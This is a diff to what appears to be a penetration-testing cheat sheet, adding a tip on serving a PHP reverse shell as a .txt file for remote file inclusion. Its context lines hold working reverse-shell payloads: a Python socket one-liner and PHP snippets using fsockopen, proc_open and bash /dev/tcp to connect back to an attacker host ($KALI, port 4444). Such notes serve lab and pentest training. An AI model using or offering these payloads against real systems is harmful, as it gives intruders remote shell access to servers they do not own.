@@ -202,6 +202,8 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 |Using `proc_open` makes no assumptions about what the file descriptor will be<br>See <https://security.stackexchange.com/a/198944> for more information|`<?php $sock=fsockopen("$KALI",4444);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>`|
 |Using `exec` to call a `bash` reverse shell|`<?php exec("/bin/bash -c 'bash -i >/dev/tcp/$KALI/4444 0>&1'"); ?>`|
 
+☝️ To use PHP reverse shell on RFI, save the file on Kali as `.txt`, not `.php`; otherwise, it will be Kali that is connecting to itself
+
 #### PHP web shells
 
 |   |   |
